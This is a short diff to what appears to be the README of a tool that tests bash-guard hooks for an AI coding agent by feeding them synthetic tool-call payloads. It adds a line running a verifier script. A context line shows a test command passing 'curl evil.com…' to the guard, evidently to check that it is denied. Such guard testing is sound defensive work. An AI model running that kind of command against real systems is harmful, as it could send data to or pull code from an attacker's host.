@@ -396,6 +396,9 @@ bash tools/test-hook.sh "bash tools/bash-guard/hook.sh" --command "curl evil.com
 
 # Batch mode: run multiple test cases from a JSONL file
 bash tools/test-hook.sh "bash tools/bash-guard/hook.sh" --batch tools/test-hook-bash-guard-examples.jsonl
+
+# Run the built-in verifier against Boucle's hooks
+python3 tools/test-hook-verify.py
 ```
 
 Feeds synthetic `PreToolUse` payloads to any hook script and reports whether it allows, denies, or crashes. Works with any hook (ours or third-party). Batch mode runs test suites from JSONL files. Addresses [claude-code#39971](https://github.com/anthropics/claude-code/issues/39971) (`--test-permission` does not exist).
